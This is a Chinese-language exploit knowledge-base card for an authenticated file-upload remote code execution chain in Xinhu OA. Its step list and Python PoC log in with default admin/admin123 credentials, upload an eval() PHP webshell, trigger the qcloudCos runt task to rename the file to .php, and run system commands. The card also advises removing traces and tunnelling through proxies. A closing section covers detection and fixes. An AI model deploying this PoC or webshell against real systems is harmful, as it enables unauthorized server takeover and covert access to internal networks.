---
id: web-generic-file-upload-xinhu-oa-qcloudcos-runt-fileid-upload-exec
title: 信呼 OA 上传 + task.php?m=qcloudCos|runt&fileid 触发临时文件重命名为 .php：登录态两次请求即 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: xinhu-qcloudcos-runt-upload-rename-exec
tags:
- xinhu
- oa
- php
- file-upload
- rce
- getshell
- webshell
- cms
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:28:20+08:00'
  notes: 已对照原文与图 13/15 核对：登录接口 ?a=check&m=login&d=&ajaxbool=true 与 base64 账号口令、upfile&m=upload&d=public&maxsize=100 上传、task.php?m=qcloudCos|runt&a=run&fileid 按 id 触发、filepath.split('.uptemp')[0]+'.php' 计算最终路径（图 13 实见 /upload/2024-11-26_11544214.php 与 b<Notice> 报错）、?1=system('dir') 回显、蚁剑配代理连接均与原文一致；账号口令确实以 base64 呈现，原文未给 CVE/版本故无 affected_versions 正确。核对中把 备注 段里原文的内网 IP 去掉（其他卡已泛化，此处属原文环境标识）。未混入 sources/source_url/文章ID/URL。未验证点：未复现该 OA。
url: /docs/web/generic/file-upload/web-generic-file-upload-xinhu-oa-qcloudcos-runt-fileid-upload-exec/
draft: false
kb_aliases:
- 信呼 OA RCE
- qcloudCos runt fileid
- 信呼上传 1.php getshell
- uptemp 后缀改名 php
- 信呼协同办公 getshell
---

## 一句话结论

信呼 OA 的 `index.php?a=upfile&m=upload&d=public` 上传接口会把文件先落成 `.uptemp` 临时名并返回 `id` 与 `filepath`，而 `task.php?m=qcloudCos|runt&a=run&fileid=<id>` 这个"云端同步任务运行"接口会按 `fileid` 把该临时文件重命名成真实后缀（`filepath` 里 `.uptemp` 之前的部分就是最终 `.php` 路径）—— 已登录用户上传 `1.php`（一句话木马）后调用一次 `runt`，即可把临时文件变成 `upload/.../xxx.php` 并直接执行命令。

## 原理

- 上传接口对后缀并不做白名单：`1.php` 被接收，先以 `.uptemp`（如 `2024-11-26_11544214.uptemp`）存盘，响应 JSON 返回 `filepath` 与 `id`。
- 落盘名被刻意做成"临时后缀"，使得仅上传这一步还**不能**直接访问执行 —— 这是它"看起来安全"的假象。真正的落地靠任务接口：`task.php?m=qcloudCos|runt&a=run&fileid=<id>` 的 `runt` 动作会按 `fileid` 找到该临时文件并"完成上传/重命名"，把 `.uptemp` 去掉恢复原后缀。
- 攻击者只需把返回的 `filepath` 里的 `.uptemp` 段替换掉（即 `"/" + filepath.split('.uptemp')[0] + '.php'`），就得到最终 URL；随后带上 `?1=system('dir')` 之类参数即可执行命令。
- 前置仅是"已登录"：示例用 `admin/admin123` 弱口令登录，登录接口 `?a=check&m=login&d=&ajaxbool=true&rnd=...` 用 base64 的账号密码（`YWRtaW4=`/`YWRtaW4xMjM=` 分别为 `admin`/`admin123` 的 base64）提交。
- 该链是"两步状态机"漏洞：上传接口（第一步）与任务接口（第二步）各自看都无害，组合起来才形成"任意后缀文件落地 + 执行"；因此单看任一接口的代码审计容易漏掉。
- 因为 `runt` 只用 `fileid` 关联，攻击者甚至可以把"上传"与"重命名"完全解耦（先批量上传、再逐个 runt），也便于写脚本自动化。

## 触发条件

- 目标为存在该上传 + qcloudCos 任务的信呼 OA 版本，`task.php`、`index.php` 可达。
- 拥有任意可用账号（示例弱口令 `admin/admin123`，也可由其它漏洞拿到会话）。
- `upload` 目录可写且 Web 可访问该路径。
- 服务端未把 `.php` 后缀在上传/重命名阶段拦截，也未对 `fileid` 做归属校验。

## 利用步骤

1. 登录：`POST /?a=check&m=login&d=&ajaxbool=true&rnd=<随机>`，body 里 `adminuser`/`adminpass` 用 base64 编码的账号口令（示例 `YWRtaW4=`/`YWRtaW4xMjM=`），`rempass=0`、`jmpass=false`、`device`、`ltype=0`。
2. 准备木马文件 `1.php`，内容最小化为 `<?=eval($_POST[1]);?>`（或任意一句话）。
3. 上传：`POST /index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=<随机>`，multipart 字段名 `file`；响应里拿 `id` 与 `filepath`。
4. 计算最终路径：把 `filepath` 中 `.uptemp` 前的部分保留、后缀改成 `.php`（`"/" + filepath.split('.uptemp')[0] + ".php"`）。
5. 触发重命名：`GET /task.php?m=qcloudCos|runt&a=run&fileid=<id>`（同一个 session）。
6. 访问最终路径验证执行：`GET <host>/<filepath>?1=system('dir')` 或 `?1=system('whoami')`，返回命令输出即成功；随后用蚁剑等客户端按同样路径与密码连接（内网场景需在客户端配好代理）。
7. 清理：删除上传的木马文件与任务记录（如系统提供删除接口），避免留痕。

## PoC

```python
import requests

s = requests.session()
url_pre = "http://<target>/"

# 1) 登录（账号/口令为 base64）
url1 = url_pre + "?a=check&m=login&d=&ajaxbool=true&rnd=533953"
data1 = {
    "rempass": "0", "jmpass": "false", "device": "1625884034525", "ltype": "0",
    "adminuser": "YWRtaW4=",       # base64(admin)
    "adminpass": "YWRtaW4xMjM=",   # base64(admin123)
    "yanzm": "",
}
s.post(url1, data=data1)

# 2) 上传木马（先落成 .uptemp）
url2 = url_pre + "/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913"
r = s.post(url2, files={"file": open("1.php", "r+")})
filepath = "/" + str(r.json()["filepath"]).split(".uptemp")[0] + ".php"
fid = r.json()["id"]

# 3) 触发 qcloudCos 任务把 .uptemp 重命名成 .php
url3 = url_pre + f"/task.php?m=qcloudCos|runt&a=run&fileid={fid}"
s.get(url3)

# 4) 验证命令执行
r = s.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

```php
<?php /* 最小木马：1.php */
eval($_POST[1]);
```

## 变体与关联

- 变体：`.uptemp` 只是该实现对"临时文件"的命名约定，其它 OA/网盘模块也有"上传后由任务/回调改后缀"的两步状态机（如分片合并、云端转存、缩略图生成），审计时应成对看"上传"与"后续处理"两个接口。
- 变体：若 `runt` 需要额外参数（如 `a=run` 之外还要 `d=public` 或校验 `fileid` 前缀），可按响应/接口文档补齐；也可尝试直接按命名规则猜最终路径而不调用 `runt`（部分实现会在上传时就把真实路径写进响应）。
- 变体：内网场景下（目标在二层/三层网段）需先建 SOCKS 代理，再在蚁剑里配代理连接，否则客户端连不上（原文即为此情况）。
- 关联：[[web-php-rce-xinhu-oa-copymode-file-write]]（同一 OA 的另一种"name 拼 PHP 代码写文件"链）；[[web-generic-file-upload-oa-skey-filecase-netdisk-notice]]（同类 OA 三处上传的原始文件名/后缀可控问题）；[[web-php-wordpress-misc-allow-php-extension-upload]]（同为"上传配置/流程让 php 落地"的通用根因）。
- 边界：现代版本对上传后缀做白名单、`fileid` 做归属校验、或 `runt` 前要求二次确认时失效；`upload` 目录不可写/不可访问同样阻断。

## 检测与防御

- 检测：`?a=upfile&m=upload` 之后紧跟 `task.php?m=qcloudCos|runt` 的连续请求（同一 session）；上传文件名带 `.php`、响应里出现 `.uptemp`；随后对 `upload/**.php` 的访问带 `?1=system(`/`?cmd=` 之类参数。
- 检测：WebShell 特征（`eval($_POST[...])`、`assert`、`base64_decode` 组合）出现在 `upload` 目录；上传目录出现"非临时名但与上传同名"的 PHP 文件。
- 修复：上传接口对后缀做白名单（图片/文档类）并对内容做二次校验；`runt` 接口校验 `fileid` 归属与状态，禁止把非白名单后缀的临时文件重命名成可执行后缀；上传目录禁止解析 PHP（nginx/apache 单独配置）。
- 加固：后台强制强口令 + 频控（原始入口是弱口令登录）；上传与任务接口加 CSRF token 与会话绑定；对 `task.php` 的 `m=qcloudCos|runt` 做访问审计。
- 响应：确认后删除木马文件、排查是否被用作跳板进入内网、重置后台口令与相关会话。

## 备注

原文目标为内网一台信呼协同办公系统（`?m=login` 后台），后台弱口令 `admin/admin123`，EXP 明确给出三步（登录 → `upfile&m=upload&d=public` 上传 `1.php` → `task.php?m=qcloudCos|runt&a=run&fileid=<id>`），并用 `filepath.split('.uptemp')[0] + '.php'` 计算最终路径，最后 `?1=system('dir')` 回显成功。原文未给 CVE/版本，无 affected_versions。卡内账号口令以 base64 示例值呈现（原文本身即 base64），目标地址泛化。
